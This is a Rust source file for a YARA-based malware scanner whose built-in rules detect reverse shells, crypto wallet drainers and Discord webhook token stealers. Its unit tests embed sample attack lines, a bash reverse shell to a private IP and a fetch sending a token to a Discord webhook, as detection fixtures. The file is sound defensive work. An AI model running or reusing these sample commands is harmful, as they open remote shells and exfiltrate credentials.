use crate::RuleMatch;
use std::path::Path;
use tracing::{info, warn};

pub const DEFAULT_YARA_RULES: &str = r#"
rule ReverseShellGeneric {
    meta:
        description = "Detects generic reverse shell commands (bash, nc, python)"
        severity = "critical"
    strings:
        $bash = "/bin/sh -i >& /dev/tcp/" ascii
        $bash2 = "/bin/bash -i >& /dev/tcp/" ascii
        $nc1 = "nc -e /bin/sh" ascii
        $nc2 = "nc -e /bin/bash" ascii
        $nc3 = "ncat -e /bin/sh" ascii
        $py = "pty.spawn(\"/bin/bash\")" ascii
        $py2 = "pty.spawn(\"/bin/sh\")" ascii
    condition:
        any of them
}

rule CryptoDrainerGeneric {
    meta:
        description = "Detects crypto wallet drainer and transaction manipulation signatures"
        severity = "high"
    strings:
        $drain1 = "drainAll" ascii nocase
        $drain2 = "drainToken" ascii nocase
        $permit = "signTypedData_v4" ascii
        $seaport = "0x00000000000000ADc04C56Bf30aC9d3c0aAF14bC" ascii
        $transfer_from = "transferFrom(address,address,uint256)" ascii
    condition:
        2 of them
}

rule DiscordWebhookStealer {
    meta:
        description = "Detects Discord webhook exfiltration pattern in scripts"
        severity = "critical"
    strings:
        $hook = "discord.com/api/webhooks/" ascii nocase
        $token = "token" ascii nocase
        $pass = "password" ascii nocase
    condition:
        $hook and ($token or $pass)
}
"#;

pub struct YaraEngine {
    rules: Option<yara_x::Rules>,
}

impl YaraEngine {
    /// Initialize YaraEngine with default built-in rules and optional directory of .yar files
    pub fn new(custom_rules_dir: Option<&Path>) -> Self {
        let mut compiler = yara_x::Compiler::new();

        // 1. Add default rules
        if let Err(e) = compiler.add_source(DEFAULT_YARA_RULES) {
            warn!("Failed to compile default YARA rules: {}", e);
        }

        // 2. Add custom rules from directory if provided
        if let Some(dir) = custom_rules_dir {
            if dir.is_dir() {
                Self::load_rules_from_dir(dir, &mut compiler);
            }
        }

        let rules = compiler.build();
        Self { rules: Some(rules) }
    }

    fn load_rules_from_dir(dir: &Path, compiler: &mut yara_x::Compiler) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
                    if ext == "yar" || ext == "yara" {
                        if let Ok(source) = std::fs::read_to_string(&path) {
                            if let Err(e) = compiler.add_source(source.as_str()) {
                                warn!("Failed to compile YARA rule file {:?}: {}", path, e);
                            } else {
                                info!("Loaded custom YARA rule: {:?}", path);
                            }
                        }
                    }
                }
            }
        }
    }

    /// Scan a buffer/file data with YARA rules and return findings as RuleMatch
    pub fn scan_data(&self, file_path: &str, data: &[u8]) -> Vec<RuleMatch> {
        let mut matches = Vec::new();
        let rules = match &self.rules {
            Some(r) => r,
            None => return matches,
        };

        let mut scanner = yara_x::Scanner::new(rules);
        if let Ok(scan_results) = scanner.scan(data) {
            for rule in scan_results.matching_rules() {
                let rule_id = rule.identifier();
                let severity = match rule_id {
                    "ReverseShellGeneric" | "DiscordWebhookStealer" => "critical",
                    "CryptoDrainerGeneric" => "high",
                    _ => "medium",
                };

                let matched_desc = format!("YARA Rule: {}", rule_id);
                let context = format!("Matched YARA rule {} in {}", rule_id, file_path);

                matches.push(RuleMatch {
                    file_path: file_path.to_string(),
                    line_number: 1,
                    matched_pattern: matched_desc,
                    severity: severity.to_string(),
                    context,
                });
            }
        }

        matches
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_yara_reverse_shell_detection() {
        let engine = YaraEngine::new(None);
        let sample = b"import os\nos.system('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
        let findings = engine.scan_data("exploit.py", sample);
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.matched_pattern.contains("ReverseShellGeneric")));
    }

    #[test]
    fn test_yara_discord_webhook_stealer() {
        let engine = YaraEngine::new(None);
        let sample = b"const url = 'https://discord.com/api/webhooks/123/xyz'; fetch(url, { body: JSON.stringify({ token: 'stolen' }) });";
        let findings = engine.scan_data("stealer.js", sample);
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
    }
}
